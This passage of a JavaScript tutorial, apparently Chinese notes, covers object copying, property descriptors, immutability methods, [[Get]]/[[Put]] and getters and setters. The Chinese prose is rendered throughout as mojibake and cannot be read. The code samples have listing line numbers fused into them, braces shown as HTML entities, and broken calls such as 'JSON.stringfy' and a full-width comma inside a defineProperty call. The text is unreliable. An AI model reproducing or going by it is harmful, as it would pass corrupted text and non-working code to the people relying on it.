¹æ®å…¶å¯¹åº”çš„è¡Œä¸ºå’Œç”¨é€”è¿›è¡Œäº†ä¼˜åŒ–ï¼Œæ‰€ä»¥æœ€å¥½åªç”¨å¯¹è±¡æ¥å­˜å‚¨/å€¼å¯¹ï¼Œåªç”¨æ•°ç»„æ¥å­˜å‚¨æ•°å€¼ä¸‹æ ‡/å€¼å¯¹ã€‚ æ³¨æ„ï¼šå¦‚æžœä½ è¯•å›¾å‘æ•°ç»„æ·»åŠ ä¸€ä¸ªå±žæ€§ï¼Œä½†æ˜¯å±žæ€§åâ€œçœ‹èµ·æ¥â€åƒä¸€ä¸ªæ•°å­—ï¼Œé‚£å®ƒä¼šå˜æˆä¸€ä¸ªæ•°å€¼ä¸‹æ ‡ï¼ˆå› ä¸ºä½ ä¼šä¿®æ”¹æ•°ç»„çš„å†…éƒ¨è€Œä¸æ˜¯æ·»åŠ ä¸€ä¸ªå±žæ€§ï¼‰ï¼Œä¾‹å¦‚ 1234var myArray = ["foo",42,"bar"];myArray["3"] = "baz";myArray.length; // 4myArray[3]; // "baz" å¤åˆ¶å¯¹è±¡JavaScript åˆå­¦è€…æœ€å¸¸è§çš„é—®é¢˜ä¹‹ä¸€å°±æ˜¯å¦‚ä½•å¤åˆ¶ä¸€ä¸ªå¯¹è±¡ï¼Œçœ‹èµ·æ¥åº”è¯¥æœ‰ä¸€ä¸ªå†…ç½®çš„ copy() æ–¹æ³•ï¼Œå®žé™…ä¸Šäº‹æƒ…æ¯”ä½ æƒ³è±¡çš„æ›´å¤æ‚ï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•é€‰æ‹©ä¸€ä¸ªé»˜è®¤çš„å¤åˆ¶ç®—æ³•ã€‚ ä¸¾ä¾‹å­ï¼š 123456789101112function anotherFunction()&#123;/*..*/&#125;var anotherObject = &#123; c:true&#125;var anotherArray = [];var myObject = &#123; a:2, b:anotherObject, // å¼•ç”¨ï¼Œä¸æ˜¯å¤æœ¬ c:anotherArray, // å¦ä¸€ä¸ªå¼•ç”¨ d:anotherFunction&#125;anotherArray.push(anotherObject,myObject); å¦‚ä½•å‡†ç¡®è¡¨ç¤º myObject çš„å¤åˆ¶å‘¢ï¼Ÿ é¦–å…ˆï¼Œæˆ‘ä»¬åº”è¯¥åˆ¤æ–­å®ƒæ˜¯æµ…å¤åˆ¶è¿˜æ˜¯æ·±å¤åˆ¶ã€‚å¯¹äºŽæµ…æ‹·è´æ¥è¯´ï¼Œå¤åˆ¶å‡ºçš„æ–°å¯¹è±¡ä¸­ a çš„å€¼ä¼šå¤åˆ¶æ—§å¯¹è±¡ä¸­ a çš„å€¼ï¼Œä¹Ÿå°±æ˜¯2ï¼Œä½†æ˜¯æ–°å¯¹è±¡ä¸­ bã€cã€dä¸‰ä¸ªå±žæ€§å…¶å®žåªæ˜¯ä¸‰ä¸ªå¼•ç”¨ï¼Œå®ƒä»¬å’Œæ—§å¯¹è±¡ä¸­ bã€cã€då¼•ç”¨çš„å¯¹è±¡æ˜¯ä¸€æ ·çš„ã€‚å¯¹äºŽæ·±å¤åˆ¶æ¥è¯´ï¼Œé™¤äº†å¤åˆ¶ myObject ä»¥å¤–è¿˜ä¼šå¤åˆ¶ anotherObject å’Œ anotherArray ã€‚è¿™æ—¶å€™é—®é¢˜æ¥äº†ï¼ŒanotherArray å¼•ç”¨äº† anotherObject å’Œ myObject ï¼Œæ‰€ä»¥åˆéœ€è¦å¤åˆ¶ myObject ï¼Œè¿™æ ·å°±ä¼šç”±äºŽå¾ªçŽ¯å¼•ç”¨å¯¼è‡´æ­»å¾ªçŽ¯ã€‚ æˆ‘ä»¬æ˜¯åº”è¯¥æ£€æµ‹å¾ªçŽ¯å¼•ç”¨å¹¶ç»ˆæ­¢å¾ªçŽ¯ï¼ˆä¸å¤åˆ¶æ·±å±‚å…ƒç´ ï¼‰ï¼Ÿè¿˜æ˜¯åº”å½“ç›´æŽ¥æŠ¥é”™æˆ–è€…æ˜¯é€‰æ‹©å…¶ä»–æ–¹æ³•ï¼Ÿ é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜ä¸ç¡®å®šå¤åˆ¶ä¸€ä¸ªå‡½æ•°æ„å‘³ç€ä»€ä¹ˆï¼Œæœ‰äº›äººä¼šé€šè¿‡ toString æ¥åºåˆ—åŒ–ä¸€ä¸ªå‡½æ•°çš„æºä»£ç ï¼ˆä½†æ˜¯ç»“æžœå–å†³äºŽ JavaScript çš„å…·ä½“å®žçŽ°ï¼Œè€Œä¸”ä¸åŒçš„å¼•æ“Žå¯¹äºŽä¸åŒç±»åž‹çš„å‡½æ•°å¤„ç†æ–¹å¼ä¸ä¸€æ ·ï¼‰ã€‚é‚£ä¹ˆè¦æ€Žä¹ˆè§£å†³è¿™äº›æ£˜æ‰‹çš„é—®é¢˜ï¼Ÿè®¸å¤š JavaScriptæ ‡å‡†éƒ½æå‡ºäº†è‡ªå·±çš„è§£å†³åŠžæ³•ï¼Œä½†æ˜¯ JavaScript åº”å½“é‡‡ç”¨å“ªç§æ–¹æ³•ä½œä¸ºæ ‡å‡†ï¼Ÿåœ¨å¾ˆé•¿çš„ä¸€æ®µæ—¶é—´å†…ä¸€ç›´æ²¡æœ‰ä¸€ä¸ªæ ‡å‡†ã€‚ å¯¹äºŽ JSON å®‰å…¨ï¼ˆä¹Ÿå°±æ˜¯è¯´å¯ä»¥è¢«åºåˆ—åŒ–ä¸ºä¸€ä¸ª JSON å­—ç¬¦ä¸²å¹¶ä¸”å¯ä»¥æ ¹æ®è¿™ä¸ªå­—ç¬¦ä¸²è§£æžå‡ºä¸€ä¸ªç»“æž„å’Œå€¼å®Œå…¨ä¸€æ ·çš„å¯¹è±¡ï¼‰çš„å¯¹è±¡æ¥è¯´ï¼Œæœ‰ä¸€ç§å·§å¦™çš„å¤åˆ¶æ–¹æ³•ï¼š 1var newObj = JSON.parse(JSON.stringfy(someObj)); å½“ç„¶ ï¼Œè¿™ç§æ–¹æ³•éœ€è¦ä¿è¯å¯¹è±¡æ˜¯ JSON å®‰å…¨çš„ï¼Œæ‰€ä»¥åªä½¿ç”¨éƒ¨åˆ†æƒ…å†µã€‚ ç›¸æ¯”æ·±å¤åˆ¶ï¼Œæµ…å¤åˆ¶éžå¸¸æ˜“æ‡‚å¹¶ä¸”é—®é¢˜è¦å°‘å¾—å¤šï¼Œæ‰€ä»¥ ES6 å®šä¹‰äº† Object.assign(..)æ–¹æ³•æ¥å®žçŽ°æµ…å¤åˆ¶ã€‚Object.assign(..)æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®æ ‡å¯¹è±¡ï¼Œä¹‹åŽè¿˜å¯ä»¥è·Ÿä¸€ä¸ªæˆ–å¤šä¸ªæºå¯¹è±¡çš„æ‰€æœ‰å¯æžšä¸¾ï¼ˆenumerableï¼‰çš„è‡ªæœ‰é”®ï¼ˆowned keyï¼‰å¹¶æŠŠå®ƒä»¬å¤åˆ¶ï¼ˆä½¿ç”¨ = æ“ä½œç¬¦èµ‹å€¼ï¼‰åˆ°ç›®æ ‡å¯¹è±¡ï¼Œæœ€åŽè¿”å›žç›®æ ‡å¯¹è±¡ï¼Œå°±åƒè¿™æ ·ï¼š 12345var newObj = Object.assign(&#123;&#125;,myObject);newObj.a; // 2newObj.b === anotherObject; // truenewObj.c === anotherArray; // truenewObj.d === anotherFunction; // true ç”±äºŽObject.assign(..)å°±æ˜¯ä½¿ç”¨ = æ“ä½œç¬¦æ¥èµ‹å€¼ï¼Œæ‰€ä»¥æºå¯¹è±¡å±žæ€§çš„ä¸€äº›ç‰¹æ€§ï¼ˆæ¯”å¦‚ writableï¼‰ä¸ä¼šè¢«å¤åˆ¶åˆ°ç›®æ ‡å¯¹è±¡ å±žæ€§æè¿°ç¬¦åœ¨ ES5 ä¹‹å‰ï¼ŒJavaScript è¯­è¨€æœ¬èº«å¹¶æ²¡æœ‰æä¾›å¯ä»¥ç›´æŽ¥æ£€æµ‹å±žæ€§ç‰¹æ€§çš„æ–¹æ³•ï¼Œæ¯”å¦‚åˆ¤æ–­å±žæ€§æ˜¯å¦å¯è¯»ã€‚ ä½†æ˜¯ä»Ž ES5 å¼€å§‹ï¼Œæ‰€æœ‰å±žæ€§éƒ½å…·å¤‡äº†å±žæ€§æè¿°ç¬¦ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 123456789101112var myObject = &#123; a:2&#125;Object.getOwnPropertyDescriptor(myObject,"a");/*&#123; value: 2, writable: true, enumerable: true, configurable: true, &#125;*/ ä¸Šé¢è¿™ä¸ªæ™®é€šå¯¹è±¡å±žæ€§å¯¹åº”çš„å±žæ€§æè¿°ç¬¦ï¼ˆå·²è¢«ç§°ä¸ºâ€œæ•°æ®æè¿°ç¬¦â€ï¼Œå› ä¸ºå®ƒåªä¿å­˜äº†ä¸€ä¸ªæ•°æ®å€¼ï¼‰å¯ä¸ä»…ä»…åªæ˜¯ä¸€ä¸ª2ï¼Œå®ƒè¿˜åŒ…å«äº†å¦å¤–ä¸‰ä¸ªç‰¹æ€§ï¼šwritable(å¯å†™)ã€enumerable(å¯æžšä¸¾)ã€configurable(å¯é…ç½®) åœ¨åˆ›å»ºæ™®é€šå±žæ€§æ—¶å±žæ€§æè¿°ç¬¦ä¼šä½¿ç”¨é»˜è®¤å€¼ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ Object.defineProperty(..)æ¥æ·»åŠ ä¸€ä¸ªæ–°å±žæ€§æˆ–è€…ä¿®æ”¹ä¸€ä¸ªå·²æœ‰å±žæ€§ï¼ˆå¦‚æžœå®ƒæ˜¯ configurabelï¼‰å¹¶å¯¹ç‰¹æ€§è¿›è¡Œè®¾ç½®ã€‚ä¸¾ä¸ªä¾‹å­ï¼š 12345678var myObject = &#123;&#125;;Object.defineProperty(myObject,"a",&#123; value:2, writable: true, enumerable: true, configurable: true, &#125;);myObject.a; // 2 æˆ‘ä»¬ä½¿ç”¨ defineProperty(..)ç»™ myObject æ·»åŠ äº†ä¸€ä¸ªæ™®é€šçš„å±žæ€§å¹¶æ˜¾ç¤ºæŒ‡å®šäº†ä¸€äº›ç‰¹æ€§ã€‚ç„¶åŽï¼Œä¸€èˆ¬æ¥è¯´ä½ ä¸ä¼šä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œé™¤éžä½ æƒ³ä¿®æ”¹å±žæ€§æè¿°ç¬¦ã€‚ 1.Writabelwritable å†³å®šäº†æ˜¯å¦å¯ä»¥ä¿®æ”¹å±žæ€§çš„å€¼ï¼Œä¸¾ä¸ªä¾‹å­ï¼š 123456789var myObject = &#123;&#125;;Object.defineProperty(myObject,"a",&#123; value:2, writable: false, // ä¸å¯å†™ enumerable: true, configurable: true, &#125;);myObject.a = 3;myObject.a; // 2 å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯¹äºŽå±žæ€§å€¼çš„ä¿®æ”¹é™é»˜å¤±è´¥ï¼ˆsliently failedï¼‰ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œè¿™ç§æ–¹æ³•è¿˜ä¼šæŠ¥é”™ã€‚ 12345678910"use strict";var myObject = &#123;&#125;;Object.defineProperty(myObject,"a",&#123; value:2, writable: false, // ä¸å¯å†™ enumerable: true, configurable: true, &#125;);myObject.a = 3; // TypeError TypeError é”™è¯¯è¡¨ç¤ºæˆ‘ä»¬æ— æ³•ä¿®æ”¹ä¸€ä¸ªä¸å¯å†™çš„å±žæ€§ å¯ä»¥æŠŠ writableï¼šfalse çœ‹ä½œæ˜¯å±žæ€§ä¸å¯æ”¹å˜ï¼Œç›¸å½“äºŽä½ å®šä¹‰äº†ä¸€ä¸ªç©ºçš„ setterä¸¥æ ¼æ¥è¯´ï¼Œå¦‚æžœè¦å’Œ writableï¼šfalseä¸€è‡´çš„è¯ï¼Œä½ çš„ setter è¢«è°ƒç”¨æ—¶åº”å½“æŠ›å‡ºä¸€ä¸ª TypeError é”™è¯¯ 2.Configurableåªè¦å±žæ€§æ˜¯å¯é…ç½®çš„ï¼Œå°±å¯ä»¥ä½¿ç”¨ defineProperty(..)æ–¹æ³•æ¥ä¿®æ”¹å±žæ€§æè¿°ç¬¦ 123456789101112131415161718192021var myObject = &#123; a:2&#125;;myObject.a = 3;myObject.a; // 3Object.defineProperty(myObject,"a",&#123; value:4, writable: true, enumerable: true, configurable: false, // ä¸å¯é…ç½® &#125;);myObject.a; // 4myObject.a = 5;myObject.a; // 5Object.defineProperty(myObject,"a",&#123; value:6, writable: true, enumerable: true, configurable: true,&#125;); // TypeError æœ€åŽä¸€ä¸ª defindProperty(..)ä¼šäº§ç”Ÿä¸€ä¸ª TypeError é”™è¯¯ï¼Œä¸ç®¡æ˜¯ä¸æ˜¯å¤„äºŽä¸¥æ ¼æ¨¡å¼ï¼Œå°è¯•ä¿®æ”¹ä¸€ä¸ªä¸å¯é…ç½®çš„å±žæ€§æè¿°ç¬¦éƒ½ä¼šå‡ºé”™ã€‚æŠŠ configurable ä¿®æ”¹æˆ false æ˜¯å•å‘æ“ä½œï¼Œæ— æ³•æ’¤é”€ã€‚ æœ‰ä¸€ä¸ªä¾‹å¤–ï¼Œå³ä¾¿å±žæ€§æ˜¯ configurableï¼šfalse,æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥æŠŠ writable çš„çŠ¶æ€ä¸º true æ”¹æˆ false,ä½†æ˜¯æ— æ³•ä»Ž false æ”¹ä¸º true. é™¤äº†æ— æ³•ä¿®æ”¹ä¹‹å¤–ï¼Œconfigurabelï¼šfalse è¿˜ä¼šç¦æ­¢åˆ é™¤è¿™ä¸ªå±žæ€§ï¼š 123456789101112131415161718var myObject = &#123; a:2&#125;;myObject.a; // 2delete myObject.a;myObject.a; // undefinedObject.defineProperty(myObject,"a",&#123; value:2, writable: true, enumerable: true, configurable: false, // ä¸å¯é…ç½® &#125;);myObject.a; // 2delete myObject.a;myObject.a; // 2 æœ€åŽä¸€ä¸ªè¯­å¥ delete è¯­å¥ï¼ˆé™é»˜ï¼‰å¤±è´¥äº†ï¼Œå› ä¸ºå±žæ€§æ˜¯ä¸å¯é…ç½®çš„ã€‚ åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œdelete åªç”¨æ¥ç›´æŽ¥åˆ é™¤å¯¹è±¡çš„ï¼ˆå¯åˆ é™¤ï¼‰å±žæ€§ï¼Œå¦‚æžœå¯¹è±¡çš„æŸä¸ªå±žæ€§æ˜¯æŸä¸ªå¯¹è±¡/å‡½æ•°çš„æœ€åŽä¸€ä¸ªå¼•ç”¨è€…ï¼Œå¯¹è¿™ä¸ªå±žæ€§æ‰§è¡Œ delete æ“ä½œä¹‹åŽï¼Œè¿™ä¸ªæœªå¼•ç”¨çš„å¯¹è±¡/å‡½æ•°å°±å¯ä»¥è¢«åžƒåœ¾å›žæ”¶ã€‚ä½†æ˜¯ï¼Œä¸è¦æŠŠ delete çœ‹åšä¸€ä¸ªé‡Šæ”¾å†…å­˜çš„å·¥å…·ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªåˆ é™¤å¯¹è±¡å±žæ€§çš„æ“ä½œï¼Œä»…æ­¤è€Œå·²ã€‚ 3.Enumerable æœ€åŽä¸€ä¸ªå±žæ€§æè¿°ç¬¦æ˜¯ enumerableï¼Œä»Žåå­—å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªæè¿°ç¬¦æŽ§åˆ¶çš„æ˜¯å±žæ€§æ˜¯å¦ä¼šå‡ºçŽ°åœ¨å¯¹è±¡çš„å±žæ€§æžšä¸¾ä¸­ï¼Œæ¯”å¦‚è¯´ for..in å¾ªçŽ¯ï¼Œå¦‚æžœæŠŠ enumerable è®¾ç½®æˆ falseï¼Œè¿™ä¸ªå±žæ€§å°±ä¸ä¼šå‡ºçŽ°åœ¨æžšä¸¾ä¸­ï¼Œè™½ç„¶ä»ç„¶å¯ä»¥æ­£å¸¸è®¿é—®å®ƒã€‚ç›¸å¯¹çš„ï¼Œè®¾ç½®æˆ true å°±ä¼šè®©ä»–å‡ºçŽ°åœ¨æžšä¸¾ä¸­ã€‚ ç”¨æˆ·å®šä¹‰çš„æ‰€æœ‰æ™®é€šå‡½æ•°é»˜è®¤éƒ½æ˜¯å¯æžšä¸¾çš„ï¼Œå¦‚æžœä¸å¸Œæœ›æŸäº›ç‰¹æ®Šçš„å±žæ€§å‡ºçŽ°åœ¨æžšä¸¾ä¸­ï¼Œå°±å¯ä»¥æ‰‹åŠ¨è®¾ç½®ä¸º false. ä¸å˜å½¢æœ‰æ—¶å€™ï¼Œå¸Œæœ›å±žæ€§æˆ–è€…å¯¹è±¡æ˜¯ä¸å¯æ”¹å˜çš„ï¼ˆæ— è®ºæ˜¯æœ‰æ„è¿˜æ˜¯æ— æ„çš„ï¼‰ï¼Œåœ¨ ES5 ä¸­å¯ä»¥é€šè¿‡å¾ˆå¤šæ–¹æ³•æ¥å®žçŽ°ã€‚ å¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯ï¼Œæ‰€æœ‰çš„æ–¹æ³•åˆ›å»ºçš„éƒ½æ˜¯æµ…ä¸å˜æ€§ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä»¬åªä¼šå½±å“ç›®æ ‡å¯¹è±¡å’Œå®ƒçš„ç›´æŽ¥å±žæ€§ï¼Œå¦‚æžœç›®æ ‡å¯¹è±¡å¼•ç”¨äº†å…¶ä»–å¯¹è±¡ï¼ˆæ•°ç»„ã€å¯¹è±¡ã€å‡½æ•°ç­‰ï¼‰ï¼Œå…¶ä»–å¯¹è±¡çš„å†…å®¹ä¸å—å½±å“ï¼Œä»ç„¶æ˜¯å¯å˜çš„ 123myImmutableObject.foo; // [1,2,3]myImmutableObject.foo.push(4); // [1,2,3]myImmutableObject.foo; // [1,2,3,4] å‡è®¾ä»£ç ä¸­çš„ myImmutableObject å·²ç»è¢«åˆ›å»ºè€Œä¸”æ˜¯ä¸å¯å˜çš„ï¼Œä½†æ˜¯ä¸ºäº†ä¿æŠ¤å®ƒçš„å†…å®¹ myImmutableObject.foo ï¼Œä½ è¿˜éœ€ä½¿ç”¨ä¸‹é¢æ–¹æ³•è®© foo ä¹Ÿæ˜¯ä¸å¯å˜çš„ã€‚ 1.å¯¹è±¡å¸¸é‡ç»“åˆ writableï¼šfalse å’Œ configurable ï¼šfalse å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªçœŸæ­£çš„å¸¸é‡å±žæ€§ï¼ˆä¸å¯ä¿®æ”¹ã€é‡å®šä¹‰æˆ–åˆ é™¤ï¼‰ 123456var myObject = &#123;&#125;;Object.defineProperty(myObject,"FAVORITE_NUMBER",&#123; value:42, writable: false, configurable: false, &#125;); 2.ç¦æ­¢æ‰©å±•ç¦æ­¢ä¸€ä¸ªå¯¹è±¡æ·»åŠ æ–°çš„å±žæ€§å¹¶ä¸”ä¿ç•™å·²æœ‰çš„å±žæ€§ï¼Œå¯ä»¥ä½¿ç”¨ Object.preventExtensions(â€¦) 123456var myObject = &#123; a:2&#125;;Object.preventExtensions(myObject);myObject.b = 3;myObject.b; // undefined 3.å¯†å°Object.seal(..)ä¼šåˆ›å»ºä¸€ä¸ªâ€œå¯†å°â€çš„å¯¹è±¡ã€‚è¿™ä¸ªæ–¹æ³•å®žé™…ä¸Šä¼šåœ¨ä¸€ä¸ªçŽ°æœ‰å¯¹è±¡ä¸Šè°ƒç”¨ Object.preventExtensions(..)å¹¶æŠŠæ‰€æœ‰çŽ°æœ‰å±žæ€§æ ‡è®°ä¸º configurableï¼šfalse. æ‰€ä»¥ï¼Œå¯†å°ä¹‹åŽä¸ä»…ä¸èƒ½æ·»åŠ å±žæ€§ï¼Œä¹Ÿä¸èƒ½é‡æ–°é…ç½®æˆ–è€…åˆ é™¤çŽ°æœ‰çš„å±žæ€§ï¼ˆè™½ç„¶å¯ä»¥ä¿®æ”¹å±žæ€§çš„å€¼ï¼‰ 4.å†»ç»“Object.freeze(..) ä¼šåˆ›å»ºä¸€ä¸ªå†»ç»“å¯¹è±¡ï¼Œè¿™ä¸ªæ–¹æ³•å®žé™…ä¸Šä¼šåœ¨ä¸€ä¸ªçŽ°æœ‰å¯¹è±¡ä¸Šè°ƒç”¨ Object.seal(..)æŠŠæ‰€æœ‰æ•°æ®è®¿é—®å±žæ€§æ ‡è®°ä¸º writableï¼šfalse.è¿™æ ·å°±æ— æ³•ä¿®æ”¹å®ƒä»¬çš„å€¼äº†ã€‚ è¿™ä¸ªæ–¹æ³•æ˜¯ä½ å¯ä»¥åº”ç”¨åœ¨å¯¹è±¡ä¸Šçš„çº§åˆ«æœ€é«˜çš„ä¸å¯å˜æ€§ï¼Œå®ƒä¼šç¦æ­¢å¯¹äºŽå¯¹è±¡æœ¬èº«åŠå…¶ä»»æ„ç›´æŽ¥å±žæ€§çš„ä¿®æ”¹ï¼ˆä¸è¿‡è¿™ä¸ªå¯¹è±¡å¼•ç”¨çš„å…¶ä»–å¯¹è±¡æ˜¯ä¸å—å½±å“çš„ï¼‰ [[Get]]å±žæ€§è®¿é—®åœ¨å®žçŽ°æ—¶æœ‰ä¸€ä¸ªå¾®å¦™å´éžå¸¸é‡è¦çš„ç»†èŠ‚ï¼š 1234var myObject = &#123; a:2&#125;;myObject.a; // 2 myObject.a æ˜¯ä¸€æ¬¡å±žæ€§è®¿é—®ï¼Œä½†æ˜¯è¿™æ¡è¯­å¥ä¸ä»…ä»…æ˜¯åœ¨ myObject ä¸­æŸ¥æ‰¾åå­—ä¸º a çš„å±žæ€§ï¼Œåœ¨è¯­è¨€è§„èŒƒä¸­ï¼ŒmyObject.a åœ¨ myObject å®žé™…ä¸Šæ˜¯å®žçŽ°äº† [[Get]] æ“ä½œï¼ˆæœ‰ç‚¹åƒå‡½æ•°è°ƒç”¨ï¼š [[Get]]ï¼ˆï¼‰ï¼‰ã€‚å¯¹è±¡é»˜è®¤çš„å†…ç½® [[Get]] æ“ä½œé¦–å…ˆåœ¨å¯¹è±¡ä¸­æŸ¥æ‰¾æ˜¯å¦æœ‰åç§°ç›¸åŒçš„å±žæ€§ï¼Œå¦‚æžœæ‰¾åˆ°å°±ä¼šè¿”å›žè¿™ä¸ªå±žæ€§çš„å€¼ã€‚ ç„¶åŽï¼Œå¦‚æžœæ²¡æœ‰çš„è¯ï¼ŒæŒ‰ç…§ [[Get]]ç®—æ³•çš„å®šä¹‰ä¼šæ‰§è¡Œå¦å¤–ä¸€ç§éžå¸¸é‡è¦çš„è¡Œä¸ºï¼ŒåŽé¢ä¼šè®²åˆ°ï¼ˆå…¶å®žå°±æ˜¯å˜é‡å¯èƒ½å­˜åœ¨çš„ [[Prototype]]é“¾ï¼Œä¹Ÿå°±æ˜¯åŽŸåž‹é“¾ï¼‰ ä½†æ˜¯æ— è®ºå¦‚ä½•éƒ½æ²¡æœ‰æ‰¾åˆ°åç§°ç›¸åŒçš„å±žæ€§ï¼Œé‚£ä¹ˆ [[Get]] å±žæ€§å°±ä¼šè¿”å›ž undefinedã€‚ä¸€ç§æ–¹æ³•å’Œè®¿é—®å˜é‡æ—¶æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¦‚æžœä½ å¼•ç”¨äº†ä¸€ä¸ªå½“å‰è¯æ³•ä½œç”¨åŸŸä¸­ä¸å­˜åœ¨çš„å˜é‡ï¼Œå¹¶ä¸ä¼šåƒå¯¹è±¡å±žæ€§ä¸€æ ·è¿”å›ž undefined ï¼Œè€Œæ˜¯ä¼šæŠ›å‡ºä¸€ä¸ª ReferenceError å¼‚å¸¸ï¼š 12345var myObject = &#123; a:undefined &#125;;myObject.a; // undefined myObject.b; // undefined ä»Žè¿”å›žå€¼çš„è§’åº¦æ¥çœ‹ï¼Œè¿™ä¸¤ä¸ªå¼•ç”¨æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«â€”â€”å®ƒä»¬éƒ½è¿”å›žäº† undefined,å®žé™…ä¸Šåº•å±‚çš„ [[Get]]æ“ä½œå¯¹ myObject.b è¿›è¡Œäº†æ›´å¤æ‚çš„å¤„ç†ï¼Œä»…é€šè¿‡è¿”å›žå€¼ï¼Œæ— æ³•åˆ¤æ–­ä¸€ä¸ªå±žæ€§æ˜¯å­˜åœ¨å¹¶ä¸”æŒæœ‰ä¸€ä¸ª undefined å€¼ï¼Œè¿˜æ˜¯å˜é‡ä¸å­˜åœ¨ï¼Œæ‰€ä»¥ [[Get]] æ— æ³•è¿”å›žæŸä¸ªç‰¹å®šå€¼è€Œè¿”å›žé»˜è®¤çš„ undefined ï¼ŒåŽé¢ä¼šå°†å¦‚ä½•åŒºåˆ†ã€‚ [[Put]]æ—¢ç„¶æœ‰å¯ä»¥èŽ·å–å±žæ€§å€¼çš„ [[Get]] å°±æœ‰ä¸€å®šå¯¹åº”çš„ [[Put]] æ“ä½œã€‚ å¯èƒ½ä¼šè®¤ä¸ºç»™å¯¹è±¡çš„å±žæ€§èµ‹å€¼ä¼šè§¦å‘ [[Put]] æ¥è®¾ç½®æˆ–è€…åˆ›å»ºè¿™ä¸ªå±žæ€§ï¼Œä½†æ˜¯å®žé™…æƒ…å†µå¹¶ä¸å®Œå…¨ æ˜¯è¿™æ ·çš„ã€‚ [[Put]]è¢«è§¦å‘æ—¶ï¼Œå®žé™…çš„è¡Œä¸ºå–å†³äºŽè®¸å¤šå› ç´ ï¼ŒåŒ…æ‹¬å¯¹è±¡ä¸­æ˜¯å¦å·²ç»å­˜åœ¨è¿™ä¸ªå±žæ€§ï¼ˆè¿™æ˜¯æœ€é‡è¦çš„å› ç´ ï¼‰ï¼› å¦‚æžœå·²ç»å­˜åœ¨è¿™ä¸ªå±žæ€§ï¼Œ [[Put]] ç®—æ³•å¤§è‡´ä¼šæ£€æŸ¥ä¸‹é¢è¿™äº›å†…å®¹ã€‚ å±žæ€§æ˜¯å¦æ˜¯è®¿é—®æè¿°ç¬¦ï¼Œå¦‚æžœæ˜¯å¹¶ä¸”å­˜åœ¨ setter å°±è°ƒç”¨ setter å±žæ€§çš„æ•°æ®æè¿°ç¬¦ä¸­ writable æ˜¯å¦æ˜¯ false,å¦‚æžœæ˜¯ï¼Œåœ¨éžä¸¥æ ¼æ¨¡å¼ä¸‹é™é»˜å¤±è´¥ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹æŠ›å‡º TypeError å¼‚å¸¸ å¦‚æžœéƒ½ä¸æ˜¯ï¼Œå°†è¯¥å€¼è®¾ç½®ä¸ºå±žæ€§çš„å€¼ å¦‚æžœå¯¹è±¡ä¸­ä¸å­˜åœ¨è¿™ä¸ªå±žæ€§ï¼Œ [[Put]] æ“ä½œä¼šæ›´åŠ å¤æ‚ï¼ŒåŽé¢ä¼šè¯´åˆ°ã€‚ Getter å’Œ Setterå¯¹è±¡é»˜è®¤çš„ [[Put]] å’Œ [[Get]] æ“ä½œåˆ†åˆ«å¯ä»¥æŽ§åˆ¶å±žæ€§å€¼çš„è®¾ç½®å’ŒèŽ·å– åœ¨ ES5 ä¸­å¯ä»¥ä½¿ç”¨ getter å’Œ setter éƒ¨åˆ†æ”¹å†™é»˜è®¤æ“ä½œï¼Œä½†æ˜¯åªèƒ½åº”ç”¨åœ¨å•ä¸ªå±žæ€§ä¸Šï¼Œæ— æ³•åº”ç”¨åœ¨æ•´ä¸ªå¯¹è±¡ä¸Šã€‚getter æ˜¯ä¸€ä¸ªéšè—å‡½æ•°ï¼Œä¼šåœ¨èŽ·å–å±žæ€§å€¼æ—¶è°ƒç”¨ã€‚setter ä¹Ÿæ˜¯ä¸€ä¸ªéšè—å‡½æ•°ï¼Œä¼šåœ¨è®¾ç½®å±žæ€§å€¼æ—¶è°ƒç”¨ã€‚ å½“ç»™ä¸€ä¸ªå±žæ€§å®šä¹‰getterã€setter æˆ–è€…ä¸¤è€…éƒ½æœ‰æ—¶ï¼Œæ•´ä¸ªå±žæ€§ä¼šè¢«å®šä¹‰ä¸º â€è®¿é—®æè¿°ç¬¦â€œï¼ˆå’Œâ€æ•°æ®æè¿°ç¬¦â€œç›¸å¯¹ï¼‰ã€‚å¯¹äºŽè®¿é—®æè¿°ç¬¦æ¥è¯´ï¼ŒJavaScript ä¼šå¿½ç•¥å®ƒä»¬çš„ value å’Œ writable ç‰¹æ€§ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯å…³å¿ƒ set å’Œ get ï¼ˆè¿˜æœ‰ configurable å’Œ enumerableï¼‰ç‰¹æ€§. 123456789101112131415var myObject = &#123; // ç»™ a å®šä¹‰ä¸€ä¸ª getter get a()&#123; return 2; &#125;&#125;Object.defineProperty(myObject/*ç›®æ ‡å¯¹è±¡*/,"b"/*å±žæ€§å*/ï¼Œ&#123; // ç»™ b è®¾ç½®ä¸€ä¸ª getter get:function()&#123;return this.a * 2&#125;, // ç¡®ä¿ b ä¼šå‡ºçŽ°åœ¨å¯¹è±¡å±žæ€§åˆ—è¡¨ä¸­ enumerable:true&#125;)myObject.a; // 2myObject.b; // 4 ä¸ç®¡æ˜¯å¯¹è±¡æ–‡å­—è¯­æ³•ä¸­çš„ get a(){â€¦}è¿˜æ˜¯ defineProperty(..) 